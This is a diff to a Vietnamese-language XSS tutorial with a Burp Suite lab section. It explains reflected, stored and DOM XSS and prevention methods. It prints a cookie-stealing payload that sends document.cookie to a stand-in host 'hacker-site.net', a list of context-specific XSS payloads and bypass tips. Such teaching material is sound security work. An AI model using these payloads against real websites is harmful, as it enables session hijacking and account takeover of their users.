@@ -23,18 +23,18 @@ Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một tron
 <img width="876" height="535" alt="image" src="https://github.com/user-attachments/assets/456248ac-aebb-46ba-a388-80cee08dc8ee" />
 
 1. Người dùng đăng nhập web và giả sử được gán session:
-Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4
+`Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4`
 2. Bằng cách nào đó, hacker gửi được cho người dùng URL:
-http://example.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2Bdocument.cookie;
-Giả sử example.com là website nạn nhân truy cập, hacker-site.net là trang của hacker tạo ra
+`http://example.com/name=var+i=new+Image;+i.src=”http://hacker-site.net/”%2Bdocument.cookie;`
+Giả sử `example.com` là website nạn nhân truy cập, `hacker-site.net` là trang của hacker tạo ra
 3. Nạn nhân truy cập đến URL trên
 4. Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request (đoạn javascript của hacker)
 5. Trình duyệt nạn nhân nhận phản hồi và thực thi đoạn javascript
 6. Đoạn javascript mà hacker tạo ra thực tế như sau:
-var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;
+`var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;`
 Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:
-GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1
-Host: hacker-site.net
+`GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1`
+`Host: hacker-site.net`
 7. Từ phía site của mình, hacker sẽ bắt được nội dung request trên và coi như session của người dùng sẽ bị chiếm. Đến lúc này, hacker có thể giả mạo với tư cách nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.
 ### 2. Stored XSS:
 Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào cơ sở dữ liệu (ở đây tôi dùng khái niệm này để chỉ database, file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). Ví dụ như các form góp ý, các comment … trên các trang web. Với kỹ thuật Stored XSS , hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.
@@ -54,13 +54,15 @@ Từ những điều này có thể thấy Stored XSS nguy hiểm hơn Reflected
 ### 3. DOM Based XSS
 DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. Chúng ta cùng xem xét một ví dụ cụ thể sau.
 Một website có URL đến trang đăng ký như sau:
-http://example.com/register.php?message=Please fill in the form
+`http://example.com/register.php?message=Please fill in the form`
 Khi truy cập đến thì chúng ta thấy một Form rất bình thường
 <img width="496" height="193" alt="image" src="https://github.com/user-attachments/assets/8fd35407-6ecd-4a0a-8610-bc9524a7c881" />
 
-Thay vì truyền "message=Please fill in the form" thì truyền message=<label>Gender</label>
-<select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>
-<script>function show(){alert();}</script>
+Thay vì truyền `"message=Please fill in the form"` thì truyền `message=<label>Gender</label>`
+`<select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>`
+`<script>function show(){alert();}</script>`
+
+
 Khi đấy form đăng ký sẽ trở thành như thế này:
 <img width="477" height="201" alt="image" src="https://github.com/user-attachments/assets/a747c78d-e63c-424f-a0c4-c0a0ddc32d34" />
 
@@ -124,66 +126,66 @@ Nguyên tắc: bắt đầu từ payload đơn giản (<script>alert(1)</script>
 
 ** Bước 3 — Xác định context của dữ liệu trong HTML
 - Context quyết định payload cần dùng:
-- HTML body text: <div>...HERE...</div>
-- HTML attribute: <img src="HERE"> hoặc <input value="HERE">
+- HTML body text: `<div>...HERE...</div>`
+- HTML attribute: `<img src="HERE"> hoặc <input value="HERE">`
 - Inside tag name (hiếm)
-- Inside JavaScript: var s = 'HERE'; hoặc document.write("HERE");
-- URL/Location: href, src, window.location
-- CSS: style="background-image:url(HERE)"
-- HTML comment: <!-- HERE -->
+- Inside JavaScript: `var s = 'HERE';` hoặc `document.write("HERE");`
+- URL/Location: `href`, `src`, `window.location`
+- CSS: `style="background-image:url(HERE)"`
+- HTML comment: `<!-- HERE -->`
   
 => Mỗi context có cách escape/encoding khác — quan trọng nhất là tìm cách phá rào ngăn (break out) khỏi context.
 
 ** Bước 4 — Thử payload cơ bản
 - Bắt đầu bằng payload hiển thị dễ thấy (an toàn cho môi trường testing):
-- Reflected/body: "><script>alert(1)</script> hoặc "><img src=x onerror=alert(1)>
-- Attribute: " onmouseover="alert(1)" hoặc ' onerror=alert(1) x='
-- JS context: ';alert(1);// hoặc ");alert(1);//
-- URL/href: javascript:alert(1) (nhiều nơi chặn)
-- DOM: "><svg/onload=alert(1)> hay </script><script>alert(1)</script>
+- Reflected/body: `"><script>alert(1)</script> hoặc "><img src=x onerror=alert(1)>`
+- Attribute: `" onmouseover="alert(1)" hoặc ' onerror=alert(1) x='`
+- JS context: `';alert(1);// hoặc ");alert(1);//`
+- URL/href: `javascript:alert(1)` (nhiều nơi chặn)
+- DOM: `"><svg/onload=alert(1)> hay </script><script>alert(1)</script>`
 
 => Quan sát: payload có được phản hồi nguyên vẹn? Nó được encode? Thực thi?
 
 **  Bước 5 — Kiểm tra DOM-based XSS
-- Thử sửa fragment/hash: http://site/page#payload
-- Quan sát DOM/Network trong DevTools: tìm document.write, innerHTML, eval, location, innerText vs textContent.
-- Thử inject chuỗi như #"><img src=x onerror=alert(1)> hoặc #test%0A<script...>
+- Thử sửa fragment/hash: `http://site/page#payload`
+- Quan sát DOM/Network trong DevTools: tìm `document.write`, `innerHTML`, `eval`, `location`, `innerText` vs `textContent`.
+- Thử inject chuỗi như `#"><img src=x onerror=alert(1)> hoặc #test%0A<script...>`
   
-=> Dùng console để chạy script: document.querySelector(...).innerHTML = location.hash — nếu thấy ứng dụng làm tương tự, nguy cơ DOM XSS cao
+=> Dùng console để chạy script: `document.querySelector(...).innerHTML = location.hash` — nếu thấy ứng dụng làm tương tự, nguy cơ DOM XSS cao
 
 ** Bước 6 — Tinh chỉnh & bypass
 - Nếu payload bị encode/chuyển đổi:
 - Thử thay đổi dạng payload (SVG, iframe, event handlers, CSS expressions).
-- Thử các ký tự escape như \x3C (hex) hoặc &#x3C; (HTML entities) nếu lọc không đầy đủ.
+- Thử các ký tự escape như `\x3C (hex)` hoặc `&#x3C`; (HTML entities) nếu lọc không đầy đủ.
   
 =>Sử dụng payload ngắn hơn, tận dụng tag tự đóng hoặc attribute-based payloads.
 
 #### Một số payload mẫu (dùng cho test, sửa theo context)
 
 a. Body / Reflected: 
-- <script>alert(1)</script>
-- "><img src=x onerror=alert(1)>
-- '><svg/onload=alert(1)>
+- `<script>alert(1)</script>`
+- `"><img src=x onerror=alert(1)>`
+- `'><svg/onload=alert(1)>`
 
 b. Attribute: 
-- " onerror=alert(1) x="
-- '><img src=x onerror=alert(1)>
-- " autofocus onfocus=alert(1) x=" (dùng với input)
+- `" onerror=alert(1) x="`
+-` '><img src=x onerror=alert(1)>`
+- `" autofocus onfocus=alert(1) x=" `(dùng với input)
 
 c. Inside JavaScript string:
-- ');alert(1);//
-- ");alert(1);//
-- '+alert(1)+'
+- `');alert(1);//`
+- `");alert(1);//`
+- `'+alert(1)+'`
 
 d. URL / href:
-- javascript:alert(1) (nhiều nơi chặn/ghi bảng trắng)
-- /page?next=javascript:alert(1) (thử redirect)
+- `javascript:alert(1)` (nhiều nơi chặn/ghi bảng trắng)
+- `/page?next=javascript:alert(1)` (thử redirect)
 
 e. DOM-specific:
-- #<img src=x onerror=alert(1)>
-- #"><svg/onload=alert(1)>
+- `#<img src=x onerror=alert(1)>`
+- `#"><svg/onload=alert(1)>`
 
-! Ghi chú: thay alert(1) bằng console.log('xss') hoặc fetch đến server của bạn khi muốn fingerprinting (chỉ dùng trong môi trường có phép).
+! Ghi chú: thay `alert(1)` bằng `console.log('xss')` hoặc fetch đến server của bạn khi muốn fingerprinting (chỉ dùng trong môi trường có phép).
 
 ## Cách ngăn chặn lỗ hổng
 Mặc dù loại tấn công này được coi là một trong những loại nguy hiểm và rủi ro nhất, nhưng vẫn nên chuẩn bị một kế hoạch ngăn ngừa. Bởi vì sự phổ biến của cuộc tấn công này, có khá nhiều cách để ngăn chặn nó.
@@ -193,7 +195,7 @@ Các phương pháp phòng ngừa chính được sử dụng phổ biến bao g
 * Escaping
 Bước đầu tiên trong công tác phòng chống tấn công này là Xác thực đầu vào. Mọi thứ, được nhập bởi người dùng phải được xác thực chính xác, bởi vì đầu vào của người dùng có thể tìm đường đến đầu ra. Xác thực dữ liệu có thể được đặt tên làm cơ sở để đảm bảo tính bảo mật của hệ thống. Tôi sẽ nhắc nhở rằng ý tưởng xác thực không cho phép đầu vào không phù hợp. Vì vậy nó chỉ giúp giảm thiểu rủi ro, nhưng có thể không đủ để ngăn chặn lỗ hổng XSS có thể xảy ra.
 Một phương pháp ngăn chặn tốt khác là lọc đầu vào của người dùng. Ý tưởng lọc là tìm kiếm các từ khóa nguy hiểm trong mục nhập của người dùng và xóa chúng hoặc thay thế chúng bằng các chuỗi trống. Những từ khóa đó có thể là:
-Thẻ <script> </ script>
+Thẻ `<script> </ script>`
 Lệnh Javascript
 Đánh dấu HTML
 Lọc đầu vào khá dễ thực hành. Nó có thể được thực hiện theo nhiều cách khác nhau. Như:
@@ -224,12 +226,84 @@ Arachni là một Ruby framework với đầy đủ tính năng, modular và hi�
 ### 5. Phần mềm W3af
 W3af (Web Application Attack and Audit Framework) là một web scanner mã nguồn mở. Web scanner này cung cấp một công cụ quét và khai thác lỗ hổng cho các ứng dụng web. W3af được viết bằng ngôn ngữ Python và có sẵn cho nhiều hệ điều hành phổ biến khác như Microsoft Windows, Linux, Mac OS X, FreeBSD và OpenBSD.
 W3af được chia thành hai phần chính, đó là core và các plug-in. Bộ quét lỗ hổng xác định hầu hết các lỗ hổng trong ứng dụng web bằng cách sử dụng hơn 130 plug-in. Phần core kết hợp với các quy trình và đưa ra các tính năng dựa trên plug-in. Để từ đó tìm ra các lỗ hổng và khai thác chúng.
-# B. Thực hành
-## 1. Thực hành Reflected XSS với Burp Suite
-Thử nhập một vài kí tự "test123" vào search:
+# B. Thực hành với Burp Suite
+## 1. Thực hành Reflected XSS 
+Thử nhập một vài kí tự `test123` hoặc `<test123` vào search:
 <img width="1099" height="170" alt="image" src="https://github.com/user-attachments/assets/1ca598f5-e23b-4259-aa18-f6edbd20a763" />
 Kết quả: 
-<img width="1099" height="170" alt="image" src="https://github.com/user-attachments/assets/0f0751e7-0fab-40ba-998f-8cd62eb62dc6" />
+<img width="1915" height="1028" alt="image" src="https://github.com/user-attachments/assets/f5924e87-8f9f-4095-bad8-5178d5b77686" />
+<img width="1919" height="1029" alt="image" src="https://github.com/user-attachments/assets/6c5b722c-08e3-4cd6-bf0b-521f437c1615" />
+
+Có nghĩa là: Khi bạn nhập test123 vào và nó xuất hiện nguyên vẹn trong HTML trả về, điều đó cho thấy:
+- Server không encode các ký tự đặc biệt trước khi đưa dữ liệu vào HTML.
+- Nếu có encode, thì `<` sẽ thành `&lt;`, `>` thành `&gt;`, dấu nháy `'` thành `&#39;`…
+- Vì dữ liệu được đưa thẳng vào HTML context, hacker có thể thay `<test123` bằng đoạn `<script>...</script>` hoặc các payload khác.
+  
+Ta chèn đoạn script đơn giản: `<script>alert(1)</script>` vào search:
+
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6d3a0c10-0468-4c78-b083-3b3ad99a5514" />
+Kết quả:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4bb9e032-7142-4050-aab9-fa63d411bb66" />
+Ở Brupt Suite ta thấy:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0c53b9fc-87b2-4162-b416-b0b50ca9fe85" /> 
+
+Trong ảnh ta thấy Request gửi đi:
+- Trình duyệt gửi một request HTTP kèm tham số trên URL: `?search=<script>alert(1)</script>`
+- Nghĩa là giá trị của tham số search chính là đoạn mã JavaScript <script>alert(1)</script>.
+
+ Server xử lý:
+- Server nhận dữ liệu y nguyên từ client mà không hề lọc hoặc mã hóa các ký tự đặc biệt (<, >, ', "...).
+- Thay vì xử lý an toàn, server chèn thẳng giá trị này vào trong mã HTML của trang kết quả tìm kiếm.
+  
+ Phản hồi về trình duyệt:
+- Trình duyệt nhận HTML có chứa nguyên đoạn `<script>alert(1)</script>`.
+- Khi HTML được render, trình duyệt nhận ra thẻ <script> và thực thi luôn phần bên trong `(alert(1))`.
+  
+ Kết quả:
+- Một hộp thoại thông báo (popup) hiển thị số 1 trên trang web.
+- Đây là minh chứng cho việc trang web dễ bị Reflected XSS, vì dữ liệu từ người dùng được phản chiếu trực tiếp và thực thi dưới dạng JavaScript.
+
+## 2. Thực hành Stored XSS
+Ta thử nhập một đoạn HTML đơn giản vào phần comment của trang web để kiểm tra xem server có lọc các kí hiệu đặc biệt hay không.
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1b2d588e-88c5-4004-bf3f-db9e15f498df" />
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/30e389bb-03b1-4bed-abd1-0fb024ddd674" />
+Kết quả là:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/44d9cec3-cc90-4d6d-98b2-b3ce03a0ddc8" />
+Kết luận 
+- Server không escape hoặc encode HTML trước khi render.
+- Input tôi gửi `<h1>Hello Word</h1>` được giữ nguyên và trình duyệt hiểu nó là HTML hợp lệ, nên render chữ to (thẻ `<h1>`).
+- Đây là Stored XSS tiềm ẩn
+- Vì dữ liệu được lưu vào DB và hiển thị cho tất cả người truy cập, nếu thay <h1>Hello Word</h1> bằng code JavaScript như:`<script>alert(1);</script>`
+thì script này sẽ chạy trên trình duyệt của bất kỳ ai mở trang, cho phép bạn đánh cắp cookie, session, hoặc thực hiện hành vi tấn công khác.
+
+Ta chèn đoạn code JavaScript như sau: `<script>alert(1);</script>` vào form comment:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/87c3918e-67cb-492b-bd9a-38d5b70514ab" />
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/6f46d852-5f46-4abd-9bad-ea5e56eba313" />
+
+Kết quả:
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ec31e8f5-1d8e-4d6c-9b36-b7e1aaae66ab" />
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/8232272d-b165-4539-bc91-7c73c939c7ac" />
+Ta thấy được sau khi nhập vào trường Comment: `<script>alert(1)</script>`
+
+- Thì nội dung sau khi bạn post comment sẽ được trang web lưu nguyên nội dung này.
+- Khi trang hiển thị lại comment, trình duyệt thấy thẻ `<script>` và thực thi JavaScript bên trong → gọi `alert(1)`.
+- Và sau khi bạn tải lại trang chứa comment, trình duyệt đã thực thi code của bạn → hiện hộp thoại `alert` với số 1.
+
+* Kết luận:
+
+Trang web cho phép người dùng đăng bình luận, nhưng dữ liệu nhập vào không được kiểm tra hoặc mã hóa trước khi hiển thị. Lỗ hổng này dẫn đến Stored XSS, trong đó mã độc (payload) do kẻ tấn công chèn vào sẽ được lưu trữ trên máy chủ và tự động thực thi mỗi khi người dùng khác truy cập trang chứa bình luận đó.
+
+* Hậu quả:
+
+- Lỗ hổng Stored XSS có thể gây ra nhiều rủi ro nghiêm trọng cho người dùng và hệ thống.
+- Kẻ tấn công có thể đánh cắp thông tin nhạy cảm như cookie hoặc session token để chiếm quyền truy cập tài khoản.
+- Ngoài ra, chúng có thể giả mạo hành động của người dùng, phát tán mã độc, hoặc leo thang quyền nếu nạn nhân là quản trị viên.
+- Stored XSS cũng có thể được sử dụng để dựng giao diện lừa đảo nhằm thu thập thông tin đăng nhập, hoặc thay đổi, phá hoại nội dung trang web, gây mất uy tín và ảnh hưởng trực tiếp đến an toàn của người dùng cũng như danh tiếng của tổ chức.
+
+
+
+
+
 
 
 
